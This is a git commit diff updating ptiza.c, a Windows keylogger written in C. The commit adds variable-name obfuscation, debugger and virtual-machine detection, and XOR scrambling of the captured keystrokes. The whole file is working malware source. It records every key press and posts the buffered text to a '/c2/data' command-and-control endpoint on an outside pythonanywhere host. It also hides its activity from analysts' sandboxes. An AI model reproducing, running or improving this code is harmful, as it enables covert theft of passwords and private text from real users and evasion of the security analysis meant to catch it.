57726650d52baceac535ab3c4af0fb9786ed9351
tdsoperational <167760383+tdsoperational@users.noreply.github.com>
2024-07-13 14:59:46 +0200

    Update! Added Obfuscation, anti static analysis, aswell as anti behav analysis. Now sends keystrokes with a random 3 char key.

--- ptiza.c
+++ ptiza.c
@@ -1,6 +1,9 @@
 #include <stdio.h>
 #include <windows.h>
 #include <wininet.h>
+#include <psapi.h>
+#include <stdlib.h>
+#include <time.h>
 
 #define O1 1024
 #define O2 2000
@@ -13,24 +16,88 @@ char* O3 = "tdsoperational.pythonanywhere.com";
 typedef SHORT (WINAPI *F3)(int);
 F3 O4;
 
+void F4(char* V4) {
+    srand((unsigned int)time(NULL));
+    for (int V5 = 0; V5 < 3; ++V5) {
+        V4[V5] = 'A' + (rand() % 26);
+    }
+    V4[3] = '\0';
+}
+
+void F5(char* V6, const char* V7) {
+    int V8 = strlen(V6);
+    for (int V9 = 0; V9 < V8; ++V9) {
+        V6[V9] ^= V7[V9 % 3];
+    }
+}
+
+BOOL F6() {
+    return IsDebuggerPresent();
+}
+
+BOOL F7() {
+    const char* V10[] = {
+        "vmware.exe", "vboxservice.exe", "vboxtray.exe",
+        "vmtoolsd.exe", "vmcompute.exe", "vmmem.exe"
+    };
+    DWORD V11[1024], V12, V13;
+    unsigned int V14;
+
+    if (!EnumProcesses(V11, sizeof(V11), &V12))
+        return FALSE;
+
+    V13 = V12 / sizeof(DWORD);
+
+    for (V14 = 0; V14 < V13; V14++) {
+        if (V11[V14] != 0) {
+            TCHAR V15[MAX_PATH] = TEXT("<unknown>");
+            HANDLE V16 = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, V11[V14]);
+            if (V16) {
+                HMODULE V17;
+                DWORD V18;
+                if (EnumProcessModules(V16, &V17, sizeof(V17), &V18)) {
+                    GetModuleBaseName(V16, V17, V15, sizeof(V15) / sizeof(TCHAR));
+                }
+            }
+            for (int V19 = 0; V19 < sizeof(V10) / sizeof(V10[0]); V19++) {
+                if (strstr(V15, V10[V19]) != NULL) {
+                    CloseHandle(V16);
+                    return TRUE;
+                }
+            }
+            CloseHandle(V16);
+        }
+    }
+    return FALSE;
+}
+
 void F1() {
-    HINTERNET V4 = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (V4) {
-        HINTERNET V5 = InternetConnectA(V4, O3, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-        if (V5) {
+    if (F6() || F7()) {
+        return;
+    }
+
+    HINTERNET V20 = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (V20) {
+        HINTERNET V21 = InternetConnectA(V20, O3, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+        if (V21) {
             const char *O5 = "/c2/data";
             const char *O6 = "Content-Type: application/json\r\nUser-Agent: TLD9Browser/2.0";
-            HINTERNET V6 = HttpOpenRequestA(V5, "POST", O5, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
-            if (V6) {
-                char V7[O1 + 128];
-                sprintf(V7, "{\"content\":\"%s\"}", V1);
-                if (HttpSendRequestA(V6, O6, -1, V7, strlen(V7))) {
+            HINTERNET V22 = HttpOpenRequestA(V21, "POST", O5, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
+            if (V22) {
+                char V23[4];
+                F4(V23);
+                F5(V1, V23);
+
+                char V24[O1 + 128];
+                sprintf(V24, "{\"content\":\"%s\"}", V1);
+
+                if (HttpSendRequestA(V22, O6, -1, V24, strlen(V24))) {
                 }
-                InternetCloseHandle(V6);
+                InternetCloseHandle(V22);
             }
-            InternetCloseHandle(V5);
+            InternetCloseHandle(V21);
         }
-        InternetCloseHandle(V4);
+        InternetCloseHandle(V20);
     }
 
     EnterCriticalSection(&V3);
@@ -40,44 +107,44 @@ void F1() {
 }
 
 DWORD WINAPI F2(LPVOID O7) {
-    DWORD V8 = GetTickCount();
+    DWORD V25 = GetTickCount();
     while (1) {
-        for (int V9 = 8; V9 <= 255; V9++) {
-            if (O4(V9) & 0x0001) {
-                V8 = GetTickCount();
+        for (int V26 = 8; V26 <= 255; V26++) {
+            if (O4(V26) & 0x0001) {
+                V25 = GetTickCount();
 
-                char V10[2] = {0, 0};
-                SHORT V11 = GetKeyState(VK_CAPITAL) & 0x0001;
-                SHORT V12 = O4(VK_SHIFT) & 0x8000;
+                char V27[2] = {0, 0};
+                SHORT V28 = GetKeyState(VK_CAPITAL) & 0x0001;
+                SHORT V29 = O4(VK_SHIFT) & 0x8000;
 
-                if ((V9 >= 'A' && V9 <= 'Z')) {
-                    if (V12 ^ V11) {
-                        V10[0] = (char)V9;
+                if ((V26 >= 'A' && V26 <= 'Z')) {
+                    if (V29 ^ V28) {
+                        V27[0] = (char)V26;
                     } else {
-                        V10[0] = (char)(V9 + 32);
+                        V27[0] = (char)(V26 + 32);
                     }
-                } else if (V9 >= '0' && V9 <= '9') {
-                    if (V12) {
-                        switch (V9) {
-                            case '0': V10[0] = ')'; break;
-                            case '1': V10[0] = '!'; break;
-                            case '2': V10[0] = '@'; break;
-                            case '3': V10[0] = '#'; break;
-                            case '4': V10[0] = '$'; break;
-                            case '5': V10[0] = '%'; break;
-                            case '6': V10[0] = '^'; break;
-                            case '7': V10[0] = '&'; break;
-                            case '8': V10[0] = '*'; break;
-                            case '9': V10[0] = '('; break;
+                } else if (V26 >= '0' && V26 <= '9') {
+                    if (V29) {
+                        switch (V26) {
+                            case '0': V27[0] = ')'; break;
+                            case '1': V27[0] = '!'; break;
+                            case '2': V27[0] = '@'; break;
+                            case '3': V27[0] = '#'; break;
+                            case '4': V27[0] = '$'; break;
+                            case '5': V27[0] = '%'; break;
+                            case '6': V27[0] = '^'; break;
+                            case '7': V27[0] = '&'; break;
+                            case '8': V27[0] = '*'; break;
+                            case '9': V27[0] = '('; break;
                         }
                     } else {
-                        V10[0] = (char)V9;
+                        V27[0] = (char)V26;
                     }
                 } else {
-                    switch (V9) {
-                        case VK_SPACE: V10[0] = ' '; break;
-                        case VK_RETURN: V10[0] = '\n'; break;
-                        case VK_TAB: V10[0] = '\t'; break;
+                    switch (V26) {
+                        case VK_SPACE: V27[0] = ' '; break;
+                        case VK_RETURN: V27[0] = '\n'; break;
+                        case VK_TAB: V27[0] = '\t'; break;
                         case VK_BACK:
                             EnterCriticalSection(&V3);
                             if (V2 > 0) {
@@ -86,35 +153,35 @@ DWORD WINAPI F2(LPVOID O7) {
                             }
                             LeaveCriticalSection(&V3);
                             continue;
-                        case VK_OEM_1: V10[0] = (V12) ? ':' : ';'; break;
-                        case VK_OEM_PLUS: V10[0] = (V12) ? '+' : '='; break;
-                        case VK_OEM_COMMA: V10[0] = (V12) ? '<' : ','; break;
-                        case VK_OEM_MINUS: V10[0] = (V12) ? '_' : '-'; break;
-                        case VK_OEM_PERIOD: V10[0] = (V12) ? '>' : '.'; break;
-                        case VK_OEM_2: V10[0] = (V12) ? '?' : '/'; break;
-                        case VK_OEM_3: V10[0] = (V12) ? '~' : '`'; break;
-                        case VK_OEM_4: V10[0] = (V12) ? '{' : '['; break;
-                        case VK_OEM_5: V10[0] = (V12) ? '|' : '\\'; break;
-                        case VK_OEM_6: V10[0] = (V12) ? '}' : ']'; break;
-                        case VK_OEM_7: V10[0] = (V12) ? '"' : '\''; break;
+                        case VK_OEM_1: V27[0] = (V29) ? ':' : ';'; break;
+                        case VK_OEM_PLUS: V27[0] = (V29) ? '+' : '='; break;
+                        case VK_OEM_COMMA: V27[0] = (V29) ? '<' : ','; break;
+                        case VK_OEM_MINUS: V27[0] = (V29) ? '_' : '-'; break;
+                        case VK_OEM_PERIOD: V27[0] = (V29) ? '>' : '.'; break;
+                        case VK_OEM_2: V27[0] = (V29) ? '?' : '/'; break;
+                        case VK_OEM_3: V27[0] = (V29) ? '~' : '`'; break;
+                        case VK_OEM_4: V27[0] = (V29) ? '{' : '['; break;
+                        case VK_OEM_5: V27[0] = (V29) ? '|' : '\\'; break;
+                        case VK_OEM_6: V27[0] = (V29) ? '}' : ']'; break;
+                        case VK_OEM_7: V27[0] = (V29) ? '"' : '\''; break;
                         default: continue;
                     }
                 }
 
                 EnterCriticalSection(&V3);
                 if (V2 + 1 < O1) {
-                    strcat(V1, V10);
+                    strcat(V1, V27);
                     V2++;
                 }
                 LeaveCriticalSection(&V3);
             }
         }
 
-        if (GetTickCount() - V8 >= O2) {
+        if (GetTickCount() - V25 >= O2) {
             if (V2 > 0) {
                 F1();
             }
-            V8 = GetTickCount();
+            V25 = GetTickCount();
         }
 
         Sleep(10);
@@ -123,15 +190,15 @@ DWORD WINAPI F2(LPVOID O7) {
 }
 
 int wmain() {
-    DWORD V13;
-    HANDLE V14;
+    DWORD V30;
+    HANDLE V31;
 
     O4 = (F3)GetProcAddress(GetModuleHandle(TEXT("user32.dll")), "GetAsyncKeyState");
 
     InitializeCriticalSection(&V3);
-    V14 = CreateThread(NULL, 0, F2, NULL, 0, &V13);
-    WaitForSingleObject(V14, INFINITE);
+    V31 = CreateThread(NULL, 0, F2, NULL, 0, &V30);
+    WaitForSingleObject(V31, INFINITE);
     DeleteCriticalSection(&V3);
-    CloseHandle(V14);
+    CloseHandle(V31);
     return 0;
 }
